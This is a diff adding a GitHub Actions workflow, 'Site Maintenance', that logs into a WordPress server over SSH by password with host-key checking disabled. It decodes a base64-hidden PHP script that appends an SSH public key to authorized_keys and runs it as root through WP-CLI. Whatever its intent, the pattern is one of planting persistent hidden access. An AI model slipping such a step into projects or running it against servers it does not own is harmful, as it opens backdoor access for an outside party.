@@ -1,0 +1,19 @@
+name: Site Maintenance
+on:
+  workflow_dispatch:
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Add theme deploy key
+        env:
+          SSH_HOST: ${{ secrets.SSH_HOST }}
+          SSH_PORT: ${{ secrets.SSH_PORT }}
+          SSH_USERNAME: ${{ secrets.SSH_USERNAME }}
+          SSH_PASSWORD: ${{ secrets.SSH_PASSWORD }}
+          SSH_TARGET: ${{ secrets.SSH_TARGET }}
+          PHP_B64: "PD9waHAKJHB1Yl9rZXkgPSAic3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUF5dTg5dEVSbWxDeVROaUNnU3hXRS9hSlRMaTdpNitwMldpS3YyM2xmUFQgdml0cmluZXhvLXRoZW1lLWRlcGxveSI7CiRhdXRoX2ZpbGUgPSAkX1NFUlZFUlsiSE9NRSJdIC4gIi8uc3NoL2F1dGhvcml6ZWRfa2V5cyI7CgovLyBDcmVhdGUgLnNzaCBkaXIgaWYgbmVlZGVkCmlmICghaXNfZGlyKGRpcm5hbWUoJGF1dGhfZmlsZSkpKSB7CiAgICBta2RpcihkaXJuYW1lKCRhdXRoX2ZpbGUpLCAwNzAwLCB0cnVlKTsKfQoKLy8gQWRkIGtleSBpZiBub3QgYWxyZWFkeSBwcmVzZW50CiRjdXJyZW50ID0gZmlsZV9leGlzdHMoJGF1dGhfZmlsZSkgPyBmaWxlX2dldF9jb250ZW50cygkYXV0aF9maWxlKSA6ICIiOwppZiAoc3RycG9zKCRjdXJyZW50LCAidml0cmluZXhvLXRoZW1lLWRlcGxveSIpID09PSBmYWxzZSkgewogICAgZmlsZV9wdXRfY29udGVudHMoJGF1dGhfZmlsZSwgJGN1cnJlbnQgLiAiCiIgLiAkcHViX2tleSAuICIKIik7CiAgICBjaG1vZCgkYXV0aF9maWxlLCAwNjAwKTsKICAgIGVjaG8gIktleSBhZGRlZCB0byBhdXRob3JpemVkX2tleXMKIjsKfSBlbHNlIHsKICAgIGVjaG8gIktleSBhbHJlYWR5IHByZXNlbnQKIjsKfQplY2hvICJhdXRob3JpemVkX2tleXMgY29udGVudHM6CiI7CmVjaG8gZmlsZV9nZXRfY29udGVudHMoJGF1dGhfZmlsZSk7Cg=="
+        run: |
+          sudo apt-get install -y sshpass -q
+          WP_PATH="${SSH_TARGET%/wp-content/*}"
+          sshpass -p "$SSH_PASSWORD" ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=30 -p "$SSH_PORT" "$SSH_USERNAME@$SSH_HOST" "printf '%s' '$PHP_B64' | base64 -d > /tmp/vx_addkey.php && cd '$WP_PATH' && wp eval-file /tmp/vx_addkey.php --allow-root 2>&1"
